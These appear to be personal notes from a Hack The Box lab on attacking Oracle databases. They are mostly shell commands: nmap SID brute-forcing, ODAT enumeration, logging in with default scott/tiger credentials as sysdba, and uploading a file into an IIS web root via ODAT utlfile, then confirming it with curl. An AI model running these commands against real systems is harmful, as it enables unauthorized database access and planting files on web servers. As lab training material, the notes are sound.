
Basic Commands
```shell
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

# Running odat
python3 -m venv ~/odat-env --system-site-packages
source ~/odat-env/bin/activate
python3 ./odat.py all -s 10.129.205.19
```

Logging in to the service
```shell
# RUN THIS SCRIPT FIRST BEFORE SQLPLUS (WILL GET AN INSTABLE SHELL BUT JUST RUN)
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && sudo mkdir -p /opt/oracle && sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip && sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip && cd /opt/oracle/instantclient_21_4 && find . -type f | sort && export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH && export PATH=$LD_LIBRARY_PATH:$PATH && source ~/.bashrc && sqlplus -V

sqlplus scott/tiger@10.129.204.235/XE


# AUTO ENUM
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

If you come across the following error sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory, please execute the below
```shell
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

Oracle RDBMS - File Upload
```shell
vernonlim03@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
vernonlim03@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

```shell
curl -X GET http://10.129.204.235/testing.txt
```

